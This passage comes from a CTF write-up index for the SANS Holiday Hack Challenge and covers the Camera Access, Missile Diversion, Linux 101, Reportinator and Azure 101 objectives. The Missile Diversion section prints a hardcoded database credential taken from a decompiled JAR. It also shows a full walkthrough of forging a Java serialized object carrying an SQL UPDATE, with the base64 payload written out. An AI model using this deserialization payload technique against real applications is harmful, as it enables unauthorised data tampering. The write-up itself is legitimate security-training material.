Directory\". There must be a good reason he mentioned that specifically, and a way to access it. He also said there's someone else masterminding the whole plot. There must be a way to discover who that is using the nanosat.</p>"},{"location":"objectives/o21/#solution","title":"Solution","text":"<p>We are situated in SGS Station. To kick off we need to grab container image which can be downloaded using vending machine called NanoSat-o-Matic.</p> <p></p> <p>We have quite many options to try and complete this task. We will kick-off with GateXOR terminal which needs to be started.</p> <p></p> <p>In This task we also need to connect our docker image using wireguard. <pre><code>docker build -t nmf_client .\ndocker run -it --cap-add=NET_ADMIN -p 5900:5900 -p 6901:6901 --rm nmf_client\ndocker ps\ndocker exec -it d51cab512cd2 /bin/bash\nvi /etc/wireguard/wg0.conf\nwg-quick down wg0\nwg-quick up wg0\n</code></pre> Now we can open CTT Consumer Test Tool and interact with camera. First we interact with maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory to see available Services.</p> <p></p> <p>We can see interesting app Camera, so let's enable it using terminal app.</p> <p></p> <p></p> <p>One method is to getValue and intercept data using wireshark and then transfer it from container. We can see on screen that after running submitAction under Action service , values are populated and data is encrypted:</p> <p></p> <p></p> <p></p> <p>Second method way easier is to download it using CLI tool. (Credit to DeepPurple) <pre><code>./cli-tool.sh parameter get -r maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory -p \"App: camera\" image.jpg Base64SnapImage\n</code></pre></p> <p>OUTPUT: <pre><code>root@156f7a91c502:/opt/nmf/cli-tool# ./cli-tool.sh parameter get -r maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory -p \"App: camera\" image.jpg Base64SnapImage\n2024-01-03 13:41:45.238 esa.mo.helpertools.helpers.HelperMisc loadProperties\nINFO: Loading properties file:/opt/nmf/cli-tool/provider.properties\n2024-01-03 13:41:45.542 esa.mo.helpertools.helpers.HelperMisc loadProperties\nINFO: Loading properties file:/opt/nmf/cli-tool/settings.properties\n2024-01-03 13:41:45.564 esa.mo.helpertools.helpers.HelperMisc loadProperties\nINFO: Loading properties file:/opt/nmf/cli-tool/transport.properties\n2024-01-03 13:41:45.937 esa.mo.helpertools.helpers.HelperMisc loadProperties\nINFO: Loading properties file:/opt/nmf/cli-tool/consumer.properties\n2024-01-03 13:41:46.594 org.ccsds.moims.mo.mal.transport.MALTransportFactory newFactory\nINFO: New transport factory registered with classname: esa.mo.mal.transport.tcpip.TCPIPTransportFactoryImpl\n2024-01-03 13:41:46.665 org.ccsds.moims.mo.mal.encoding.MALElementStreamFactory newFactory\nINFO: New encoding factory registered with classname: esa.mo.mal.encoder.binary.fixed.FixedBinaryStreamFactory\n2024-01-03 13:41:46.777 esa.mo.mal.transport.tcpip.TCPIPTransport createTransportAddress\nINFO: TCP/IP Transport address: 10.1.1.2:1025\n2024-01-03 13:41:46.867 esa.mo.mal.transport.gen.GENTransport manageCommunicationChannel\nINFO: Establishing connection to remote root URI: maltcp://10.1.1.1:1024\n2024-01-03 13:41:46.886 esa.mo.mal.transport.tcpip.TCPIPConnectionPoolManager get\nINFO: The socket doesn't exist! Creating a new one...\n2024-01-03 13:41:49.972 esa.mo.helpertools.helpers.HelperMisc loadProperties\nINFO: Reloading properties file:/opt/nmf/cli-tool/consumer.properties\n\n\n2024-01-03 13:41:50.083 esa.mo.mal.transport.gen.GENTransport manageCommunicationChannel\nINFO: Establishing connection to remote root URI: maltcp://10.1.1.1:1025\n2024-01-03 13:41:50.087 esa.mo.mal.transport.tcpip.TCPIPConnectionPoolManager get\nINFO: The socket doesn't exist! Creating a new one...\n\nParameters successfully dumped to file: image.jpg\n\nConsumer successfully closed.\n</code></pre></p> <p>Simple check of file structure reveled  encrypted data starting with Base64SnapImage. Data is added every 10 secs. <pre><code>Domain: esa.NMF_SDK.camera\nBase64SnapImage 1704289056097000000 \nBase64SnapImage 1704289056098000000 \nBase64SnapImage 1704289066098000000 \nBase64SnapImage 1704289076099000000 \nBase64SnapImage 1704289086098000000 \nBase64SnapImage 1704289096098000000 \nBase64SnapImage 1704289106098000000 \nBase64SnapImage 1704289116098000000 \nBase64SnapImage 1704289126098000000 \nBase64SnapImage 1704289136098000000 /9j/4AAQSkZJRgABAQAAAQABAAD/&lt;REMOVED&gt;\n</code></pre> Our image with answer:</p> <p></p> <p>Answer</p> <p>Conquer Holiday Season!</p>"},{"location":"objectives/o21/#response","title":"Response","text":"<p>Wombley Cube</p> <p>A fellow sabateur, are you? Or just a misguided hero-wannabe? You think you're saving the holiday season, but you're meddling in something you could never understand! Yes, I sided with Jack, because Santa's betrayed the elves by forcing us to move our operations to these islands! He put the entire holiday season at risk, and I could not allow this, I had to do something. Knowing my skillset, Jack secretly informed me of his plan to show Santa the error of his ways, and recruited me to aid his mission. Why tell you all this? Because it won't change anything. Everything is already in motion, and you're too late. Plus, the satellite is state-of-the-art, and -- oh drat, did I leave the admin tools open? For some reason, I can't move when you're nearby, but if I could, I would surely stop you!</p>"},{"location":"objectives/o22/","title":"Missile Diversion","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o22/#objective","title":"Objective","text":"<p>Wombley Cube</p> <p>Thwart Jack's evil plan by re-aiming his missile at the Sun.</p> Wombley Cube <p>A fellow sabateur, are you? Or just a misguided hero-wannabe? You think you're saving the holiday season, but you're meddling in something you could never understand! Yes, I sided with Jack, because Santa's betrayed the elves by forcing us to move our operations to these islands! He put the entire holiday season at risk, and I could not allow this, I had to do something. Knowing my skillset, Jack secretly informed me of his plan to show Santa the error of his ways, and recruited me to aid his mission. Why tell you all this? Because it won't change anything. Everything is already in motion, and you're too late. Plus, the satellite is state-of-the-art, and -- oh drat, did I leave the admin tools open? For some reason, I can't move when you're nearby, but if I could, I would surely stop you!</p>"},{"location":"objectives/o22/#hints","title":"Hints","text":"Always Lock Your Computer <p>Wombley thinks he may have left the admin tools open. I should check for those if I get stuck.</p> Reportinator: SQL Injection Vulnerability in Java Application <p>Finding: SCS analysts identified a vulnerability within an externally-accessible Java application on IP address 10.136.194.88. SCS evaluated this application with the ysoserial tool and Burp Suite to manually evaluate the application for typical Java vulnerabilities. As shown in Listing 1, we discovered the application uses Java's native serialization to store and retrieve objects from the AppData database table. This method is insecure. By intercepting HTTP request traffic on 88555/TCP, malicious actors can exploit this vulnerability by crafting and submitting specially serialized objects that can lead to remote code execution upon deserialization. Exploitation of this vulnerability could enable an attacker to execute arbitrary code on the application server and create a reverse shell, delete files, or access sensitive data. This vulnerability is classified as CWE-502: Deserialization of Untrusted Data</p>"},{"location":"objectives/o22/#solution","title":"Solution","text":"<p>This is a follow-up objective to Camera Access. We are using same Satelite ground station system to interact with. We need to redirect missle from EARTH to SUN.</p> <p>First attempt was to try to decompile Java application found inside nmf-client \"missile-targeting-system-2.1.0-SNAPSHOT.jar\" During RE process using Java Decompiler and after swift code review we found interesting line:</p> <p>DriverManager.getConnection(\"jdbc:mariadb://localhost:3306/missile_targeting_system\", \"targeter\", \"cu3xmzp9tzpi00bdqvxq\");</p> <p>Let's try connecting to DB after connecting WireGuard directly from host.</p> <p><pre><code>mysql -u targeter -p -h 10.0.0.1 -P 3306 missile_targeting_system\n</code></pre> OUTPUT</p> <p><pre><code>mysql&gt; show tables;\n+------------------------------------+\n| Tables_in_missile_targeting_system |\n+------------------------------------+\n| messaging                          |\n| pointing_mode                      |\n| pointing_mode_to_str               |\n| satellite_query                    |\n| target_coordinates                 |\n+------------------------------------+\n5 rows in set (0.14 sec)\n</code></pre> Let's look into satellite_query tabkle:</p> <p><pre><code>mysql&gt; select * from satellite_query\n</code></pre> OUTPUT <pre><code>| jid | object | results\n|   1 | \ufffd\ufffd sr SatelliteQueryFileFolderUtility\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd Z isQueryZisUpdateL pathOrStatementt Ljava/lang/String;xp  t )/opt/SatelliteQueryFileFolderUtility.java         | import java.io.Serializable; &lt;CODE REMOVED&gt;\n</code></pre></p> ChatGPT <p>PROMPT Analyze code using ChatGPT <pre><code>This Java class, SatelliteQueryFileFolderUtility, appears to be a utility for handling either SQL queries/updates or file system operations based on the provided inputs. The key features and functionality are as follows:\n\nDual Functionality: It can interact with a database or perform file system operations, determined by the isQuery and isUpdate flags.\n\nDatabase Operations:\n\nQuery Execution: If isQuery is true and isUpdate is false, it executes a SQL query using the provided Connection object and returns the result in JSON format.\nUpdate Execution: If isQuery is true and isUpdate is also true, it executes a SQL update statement.\nFile System Operations:\n\nDirectory Listing: If the provided path is a directory, it lists the immediate contents of the directory.\nFile Reading: If the provided path is a file, it reads and returns the content of the file.\nError Handling: It includes basic error handling for both SQL and file system operations.\n\nSerialization: The class implements Serializable, which suggests it can be used in contexts where Java serialization is required (e.g., sending the object over a network or storing it for later use).\n\nDependency on Gson: For converting database query results to JSON, it uses the Gson library.\n\nPath or SQL Statement: The pathOrStatement variable serves dual purposes \u2013 it can either be a file system path or a SQL statement, depending on the operation mode.\n\nRobustness and Security Considerations:\n\nSQL Injection: The class uses PreparedStatement, which is good for preventing SQL injection.\nFile System Security: There are basic checks for path existence and type (file or directory), but additional security measures (like access permissions) might be needed depending on the use case.\nException Handling: The method handles SQLException and IOException but returns the exception's message as a string. For robust applications, more sophisticated error handling and logging might be required.\nFlexibility and Extension: The class is quite specific in its current form but could be extended or modified to handle a wider range of database and file system operations.\n\nOverall, this utility class offers a convenient way to perform either database operations or file system interactions based on the provided parameters, showcasing a flexible approach to handling different types of operations in a unified manner.\n</code></pre></p> <p>Let's try to fetch this object</p> <pre><code>SELECT TO_BASE64(object) FROM satellite_query WHERE jid=1\n</code></pre> <p>OUTPUT:</p> <pre><code>mysql&gt; SELECT TO_BASE64(object) FROM satellite_query WHERE jid=1\n    -&gt; ;\n+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| TO_BASE64(object)\n                                                                                                 |\n+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| rO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1\nZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAA\ndAApL29wdC9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5LmphdmE= |\n+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n1 row in set (0.31 sec)\n</code></pre> ChatGPT <pre><code>Decode\nrO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1ZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAdAApL29wdC9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5LmphdmE=\n</code></pre> <p>OUTPUT</p> <pre><code>The provided string appears to be a serialized Java object. To decode it, we need to deserialize it using Java's built-in serialization mechanism. This process involves converting the serialized binary data back into a Java object. The string looks like it has been encoded in Base64, which is commonly used to encode binary data as text.\nHere's a general approach on how to deserialize this data in Java:\nDecode the Base64 String: The string needs to be decoded from Base64 to get the original serialized binary data.\nDeserialize the Object: Use Java's ObjectInputStream along with a ByteArrayInputStream to read the binary data and deserialize it back into the original Java object.\n</code></pre> <p>Now let's try to use DUMPER to decode serialized object,</p> <p>https://github.com/NickstaDB/SerializationDumper</p> <p>First let's decode base64 string to serialized object using python and ask chatGPT to create script for Decoding it.</p> ChatGPT <p>PROMPT: python script to decode this serialized object from base64</p> <pre><code>import base64\n\n# The serialized Java object in Base64 format\nserialized_base64 = \"rO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1ZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAdAApL29wdC9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5LmphdmE=\"\n\n# Decode the Base64 string\ndecoded_data = base64.b64decode(serialized_base64)\n\n# Optionally, save the binary data to a file\nwith open(\"decoded_data.bin\", \"wb\") as file:\n    file.write(decoded_data)\nprint(\"The binary data has been decoded and saved as 'decoded_data.bin'.\")\n</code></pre> <p>Here we have our serialization object</p> <p>slingshot@slingshot:~/code/SerializationDumper$ java -jar SerializationDumper.jar -r decoded_data.bin</p> <p><pre><code>STREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_OBJECT - 0x73\n    TC_CLASSDESC - 0x72\n      className\n        Length - 31 - 0x00 1f\n        Value - SatelliteQueryFileFolderUtility - 0x536174656c6c697465517565727946696c65466f6c6465725574696c697479\n      serialVersionUID - 0x12 d4 f6 8d 0e b3 92 cb\n      newHandle 0x00 7e 00 00\n      classDescFlags - 0x02 - SC_SERIALIZABLE\n      fieldCount - 3 - 0x00 03\n      Fields\n        0:\n          Boolean - Z - 0x5a\n          fieldName\n            Length - 7 - 0x00 07\n            Value - isQuery - 0x69735175657279\n        1:\n          Boolean - Z - 0x5a\n          fieldName\n            Length - 8 - 0x00 08\n            Value - isUpdate - 0x6973557064617465\n        2:\n          Object - L - 0x4c\n          fieldName\n            Length - 15 - 0x00 0f\n            Value - pathOrStatement - 0x706174684f7253746174656d656e74\n          className1\n            TC_STRING - 0x74\n              newHandle 0x00 7e 00 01\n              Length - 18 - 0x00 12\n              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b\n      classAnnotations\n        TC_ENDBLOCKDATA - 0x78\n      superClassDesc\n        TC_NULL - 0x70\n    newHandle 0x00 7e 00 02\n    classdata\n      SatelliteQueryFileFolderUtility\n        values\n          isQuery\n            (boolean)false - 0x00\n          isUpdate\n            (boolean)false - 0x00\n          pathOrStatement\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 03\n                Length - 41 - 0x00 29\n                Value - /opt/SatelliteQueryFileFolderUtility.java - 0x2f6f70742f536174656c6c697465517565727946696c65466f6c6465725574696c6974792e6a617661\n</code></pre> Let's analyze code:</p> ChatGPT <p>PROMPT: analyze code</p> <p>The provided code is an analysis of a serialized Java object, specifically detailing its structure according to the Java serialization protocol. Here's a breakdown of the key components in the serialized data:</p> <ol> <li>Stream Magic and Version:</li> <li><code>STREAM_MAGIC</code> (0xac ed): This is a header that identifies the data as serialized object data.</li> <li> <p><code>STREAM_VERSION</code> (0x00 05): Specifies the version of the serialization protocol.</p> </li> <li> <p>Object Content:</p> </li> <li> <p><code>TC_OBJECT</code> (0x73): Indicates the start of an object.</p> </li> <li> <p>Class Description:</p> </li> <li><code>TC_CLASSDESC</code> (0x72): Indicates the start of a class description.</li> <li><code>className</code>: The name of the class is <code>SatelliteQueryFileFolderUtility</code>.</li> <li><code>serialVersionUID</code> (0x12 d4 f6 8d 0e b3 92 cb): Unique version identifier for the <code>SatelliteQueryFileFolderUtility</code> class.</li> <li><code>newHandle</code> (0x00 7e 00 00): A handle for the class description for reference.</li> <li><code>classDescFlags</code> (0x02): Indicates that the class implements <code>Serializable</code>.</li> <li> <p><code>fieldCount</code> (3 - 0x00 03): Number of fields in the class.</p> </li> <li> <p>Fields of the Class:</p> </li> <li> <p>Three fields are detailed:</p> <ol> <li><code>isQuery</code> (Boolean - 0x5a): A boolean field.</li> <li><code>isUpdate</code> (Boolean - 0x5a): Another boolean field.</li> <li><code>pathOrStatement</code> (Object - 0x4c): An object field, specifically a <code>String</code>.</li> </ol> </li> <li> <p>Class Annotations and SuperClass:</p> </li> <li><code>TC_ENDBLOCKDATA</code> (0x78): Marks the end of class annotations.</li> <li> <p><code>TC_NULL</code> (0x70): Indicates that there is no superclass.</p> </li> <li> <p>Object Data (Values of the Fields):</p> </li> <li>The values for each of the fields in the <code>SatelliteQueryFileFolderUtility</code> object are provided.<ul> <li><code>isQuery</code>: <code>false</code></li> <li><code>isUpdate</code>: <code>false</code></li> <li><code>pathOrStatement</code>: A <code>String</code> with the value \"/opt/SatelliteQueryFileFolderUtility.java\".</li> </ul> </li> </ol> <p>This analysis is typical of what you would see when examining the binary data of a serialized Java object. It outlines the class information, including its name, serial version UID, and the fields along with their types and values. This data is crucial for Java deserialization, as it tells the Java Virtual Machine how to reconstruct the object.</p> <p>We need to modify it so we can update database to point missle into SUN</p> <p><pre><code>    classdata\n      SatelliteQueryFileFolderUtility\n        values\n          isQuery\n            (boolean)false - 0x01\n          isUpdate\n            (boolean)false - 0x01\n          pathOrStatement\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 03\n                Length - 57 - 0x00 39\n                Value - UPDATE pointing_mode SET numerical_mode = 1 WHERE id = 1; - 0x550x500x440x410x540x450x200x700x6f0x690x6e0x740x690x6e0x670x5f0x6d0x6f0x640x650x200x530x450x540x200x6e0x750x6d0x650x720x690x630x610x6c0x5f0x6d0x6f0x640x650x200x3d0x200x310x200x570x480x450x520x450x200x690x640x200x3d0x200x310x3b\n</code></pre> After modification let's rebuild our stream.</p> <pre><code>java -jar SerializationDumper-v1.13.jar -b decoded_data.bin rebuilt.bin\n\nRebuilding serialization stream from dump: decoded_data.bin\nStream rebuilt, attempting to parse...\nDone, rebuilt stream written to test2.bin\n\nstrings rebuilt.bin\nSatelliteQueryFileFolderUtility\nisQueryZ\nisUpdateL\npathOrStatementt\nLjava/lang/String;xp\n9UPDATE pointing_mode SET numerical_mode = 1 WHERE id = 1;\n</code></pre> <p>Let's encode our data: <pre><code>root@slingshot:/home/slingshot/Desktop# cat rebuilt.bin | base64\nrO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1\nZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAEB\ndAA5VVBEQVRFIHBvaW50aW5nX21vZGUgU0VUIG51bWVyaWNhbF9tb2RlID0gMSBXSEVSRSBpZCA9\nIDE7\n</code></pre></p> <p>and update DB</p> <p><pre><code>INSERT INTO satellite_query (object) VALUES (FROM_BASE64('rO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1ZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAEBdAA5VVBEQVRFIHBvaW50aW5nX21vZGUgU0VUIG51bWVyaWNhbF9tb2RlID0gMSBXSEVSRSBpZCA9IDE7'));\n</code></pre> We can see update completed:</p> <p>|   2 | \ufffd\ufffd sr SatelliteQueryFileFolderUtility\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd Z isQueryZisUpdateL pathOrStatementt Ljava/lang/String;xpt 9UPDATE pointing_mode SET numerical_mode = 1 WHERE id = 1;         | SQL Update completed.</p> <p>Win!</p> <p></p> <p>Answer</p> <p>SQL Update completed.</p>"},{"location":"objectives/o22/#response","title":"Response","text":"<p>Wombley Cube</p> <p>A... missile... aimed for Santa's sleigh? I had no idea... I can't believe I was manipulated like this. I've been trained to recognize these kinds of tactics! Santa should never have put the holiday season at risk like he did, but I didn't know Jack's true intentions. But my mission to ensure Santa never again compromises the holidays is still in progress. It sounded like the satellite crashed. Based on the coordinates, looks like the crash site is right near Rudolph's Rest. Don't worry, I'll meet you there... trust me.</p>"},{"location":"objectives/o3/","title":"Linux 101","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o3/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.</p> Ginger Breddie <p>Hey, welcome to Santa's Surf Shack on tropical Christmas Island! I'm just hanging ten here, taking it easy while brushing up on my Linux skills. You ever tried getting into Linux? It's a super cool way to play around with computers.</p>"},{"location":"objectives/o3/#solution","title":"Solution","text":"<p>The North Pole \ud83c\udf81 Present Maker: All the presents on this system have been stolen by trolls. Capture trolls by following instructions here and \ud83c\udf81's will appear in the green bar below. Run the command \"hintme\" to receive a hint.</p> <p>Q1. Perform a directory listing of your home directory to find a troll and retrieve a present!</p> <pre><code>ls\n</code></pre> <p>Q2. Now find the troll inside the troll.</p> <pre><code>cat troll_19315479765589239\n</code></pre> <p>troll_24187022596776786</p> <p>Q3. Great, now remove the troll in your home directory.</p> <pre><code>rm troll_19315479765589239\n</code></pre> <p>Q4. Print the present working directory using a command.</p> <pre><code>pwd\n</code></pre> <p>/home/elf</p> <p>Q5. Good job but it looks like another troll hid itself in your home directory. Find the hidden troll!</p> <pre><code>ls -la\n</code></pre> <p>.troll_5074624024543078</p> <p>Q6. Excellent, now find the troll in your command history.</p> <pre><code>history\n</code></pre> <p>Q7. Find the troll in your environment variables.</p> <pre><code>env\n</code></pre> <p>z_TROLL=troll_20249649541603754</p> <p>Q8. Next, head into the workshop.</p> <pre><code>cd workshop/\n</code></pre> <p>Q9. A troll is hiding in one of the workshop toolboxes. Use \"grep\" while ignoring case to find which toolbox the troll is in.</p> <pre><code>grep -i  troll* *\n</code></pre> <p>toolbox_191.txt:tRoLl.4056180441832623</p> <p>Q10. A troll is blocking the present_engine from starting. Run the present_engine binary to retrieve this troll.</p> <pre><code>chmod +x present_engine\n./present_engine\n</code></pre> <p>troll.898906189498077</p> <p>Q11. Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.</p> <pre><code>mv blown_fuse0 fuse0\n</code></pre> <p>troll.898906189498077</p> <p>Q12. Now, make a symbolic link (symlink) named fuse1 that points to fuse0</p> <pre><code>ln -s fuse0 fuse1\n</code></pre> <p>Q13. Make a copy of fuse1 named fuse2.</p> <pre><code>cp fuse1 fuse2\n</code></pre> <p>Q14. We need to make sure trolls don't come back. Add the characters \"TROLL_REPELLENT\" into the file fuse2.</p> <pre><code>echo TROLL_REPELLENT &gt; fuse2 \n</code></pre> <p>Q15. Find the troll somewhere in /opt/troll_den</p> <pre><code>find /opt/troll_den/ -iname '*troll*'\n</code></pre> <p>/opt/troll_den/apps/showcase/src/main/resources/tRoLl.6253159819943018</p> <p>Q16 - Find the file somewhere in /opt/troll_den that is owned by the user troll.</p> <pre><code>find /opt/troll_den/ -user troll\n</code></pre> <p>/opt/troll_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/tr0LL_9528909612014411</p> <p>Q17 Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den.</p> <pre><code>find /opt/troll_den/ -size +108k -size -110k\n</code></pre> <p>find /opt/troll_den/ -size +108k -size -110k</p> <p>Q18 List running processes to find another troll.</p> <pre><code>ps aux\n</code></pre> <p>elf         7134  0.3  0.0  31520 26960 pts/2    S+   07:35   0:00 /usr/bin/python3 /14516_troll</p> <p>Q19 The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen.</p> <pre><code>netstat -a -t\n</code></pre> <p>tcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN</p> <p>Q20 The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll.</p> <pre><code>curl http://0.0.0.0:54321 \n</code></pre> <p>troll.73180338045875</p> <p>Q21 Your final task is to stop the 14516_troll process to collect the remaining presents.</p> <pre><code>kill -9 7134 \n</code></pre> <p>Congratulations, you caught all the trolls and retrieved all the presents!</p> <p>Answer</p> <p>Congratulations, you caught all the trolls and retrieved all the presents!</p>"},{"location":"objectives/o3/#response","title":"Response","text":"<p>Ginger Breddie</p> <p>Wow, if your surfing skills are as good as your Linux skills, you could be winning competitions!</p>"},{"location":"objectives/o4/","title":"Reportinator","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o4/#objective","title":"Objective","text":"<p>Request</p> <p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up.</p> Noel Boetie <p>Hey there, Noel Boetie speaking! I recently tried using ChatNPT to generate my penetration testing report. I need some guidance in finding any errors in the way it generated the content, especially those odd hallucinations in the LLM output.</p>"},{"location":"objectives/o4/#hints","title":"Hints","text":"Terminal: Reportinator <p>I know AI sometimes can get specifics wrong unless the prompts are well written. Maybe chatNPT made some mistakes here.</p>"},{"location":"objectives/o4/#solution","title":"Solution","text":"<p>The ChatGPT application was developed to identify hallucinations in IT Security Reports. Report No. 1, originating from non-AI sources, contrasted with three others flagged by ChatGPT for minor typographical errors. Notably, these errors were not initially detected by other applications, including BING or other free services.</p> <p></p> <p>Report nr 1 ChatGPT</p> <p>Overall, the report appears to be accurate and does not exhibit signs of AI-generated inaccuracies or hallucinations. The technical details provided align with known issues and standard practices in IT security, specifically related to Active Directory Certificate Services.</p> <p>Report nr 3 ChatGPT</p> <p>In summary, the report is largely accurate and aligns with known IT security practices and concepts, except for the mention of an invalid TCP port number (88555). This could be a simple error in the report and should be clarified or corrected. The rest of the report does not display AI-generated inaccuracies or hallucinations.</p> <p>Report nr 6 ChatGPT</p> <p>Overall, the report appears to be accurate and consistent with known IT security practices and concepts. There are no obvious AI-generated inaccuracies or hallucinations. However, the slightly imprecise use of \"HTTP SEND\" could be a typographical error or a non-standard term used by the reporting team.</p> <p>Report nr 9 ChatGPT</p> <p>In summary, while most of the report appears consistent with standard IT security practices, there are potential issues with the mention of \"HTTP 7.4.33 request\" and the recommendation to use the Windows registration key in the Location header. These elements do not align with standard IT security protocols and could be inaccuracies or AI-generated content errors.</p> <p>Due to many issues with open AI providers at beginning  BURP was used to bruteforce requests and check for all combinations in hope to find status code 200 :)</p> <pre><code>input-1=0&amp;input-2=0&amp;input-3=1&amp;input-4=0&amp;input-5=0&amp;input-6=1&amp;input-7=0&amp;input-8=0&amp;input-9=1\n</code></pre> <p></p> <p>Answer</p> <p>Halucinations found in Report 3,6,9</p>"},{"location":"objectives/o4/#response","title":"Response","text":"<p>Noel Boetie</p> <p>Great job on completing that challenge! Ever thought about how your newfound skills might come into play later on? Keep that mind sharp, and remember, today's victories are tomorrow's strategies!</p>"},{"location":"objectives/o5/","title":"Azure 101","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o5/#objective","title":"Objective","text":"<p>Request</p> <p>Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.</p> Sparkle Redberry <p>Hey, Sparkle Redberry here! So, I've been trying to learn about Azure and the Azure CLI and it's driving me nuts. Alabaster Snowball decided to use Azure to host some of his fancy new IT stuff on Geese Islands, and now us elves have to learn it too.</p>"},{"location":"objectives/o5/#hints","title":"Hints","text":"Azure CLI Reference <p>https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest</p>"},{"location":"objectives/o5/#solution","title":"Solution","text":"<p>For this task, interaction with Azure resources is required. All answers need to be entered into terminal.</p> <p>Q1. You may not know this but the Azure cli help messages are very easy to access. First, try typing:</p> <pre><code>$ az help | less\n</code></pre> <p>Q2. Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )</p> <pre><code>az account show | less\n</code></pre> <p>Output</p> <pre><code>{\n\"environmentName\": \"AzureCloud\",\n\"id\": \"2b0942f3-9bca-484b-a508-abdae2db5e64\",\n\"isDefault\": true,\n\"name\": \"northpole-sub\",\n\"state\": \"Enabled\",\n\"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n\"user\": {\n\"name\": \"northpole@northpole.invalid\",\n\"type\": \"user\"\n    }\n}\n</code></pre> <p>Q3. Excellent! Now get a list of resource groups in Azure.</p> <pre><code>az group list\n</code></pre> <p>Output</p> <pre><code>[\n    {\n        \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1\",\n        \"location\": \"eastus\",\n        \"managedBy\": null,\n        \"name\": \"northpole-rg1\",\n        \"properties\": {\n        \"provisioningState\": \"Succeeded\"\n    },\n    \"tags\": {}\n},\n    {\n        \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2\",\n        \"location\": \"westus\",\n        \"managedBy\": null,\n        \"name\": \"northpole-rg2\",\n        \"properties\": {\n        \"provisioningState\": \"Succeeded\"\n    },\n    \"tags\": {}\n    }\n]\n</code></pre> <p>Q4. Ok, now use one of the resource groups to get a list of function apps. For more information:</p> <pre><code>az functionapp list -g northpole-rg1\n</code></pre> <p>Output</p> <pre><code>[\n{\n\"appServicePlanId\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/serverfarms/EastUSLinuxDynamicPlan\",\n\"availabilityState\": \"Normal\",\n\"clientAffinityEnabled\": false,\n\"clientCertEnabled\": false,\n\"clientCertExclusionPaths\": null,\n\"clientCertMode\": \"Required\",\n\"cloningInfo\": null,\n\"containerSize\": 0,\n\"customDomainVerificationId\": \"201F74B099FA881DB9368A26C8E8B8BB8B9AF75BF450AF717502AC151F59DBEA\",\n\"dailyMemoryTimeQuota\": 0,\n\"defaultHostName\": \"northpole-ssh-certs-fa.azurewebsites.net\",\n\"enabled\": true,\n\"enabledHostNames\": [\n  \"northpole-ssh-certs-fa.azurewebsites.net\"\n],\n\"extendedLocation\": null,\n--- CODE OMITTED ---\n</code></pre> <p>Q5. Find a way to list the only VM in one of the resource groups you have access to.</p> <pre><code>az vm list -g northpole-rg2\n</code></pre> <p>Output</p> <pre><code>[\n{\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2/providers/Microsoft.Compute/virtualMachines/NP-VM1\",\n    \"location\": \"eastus\",\n    \"name\": 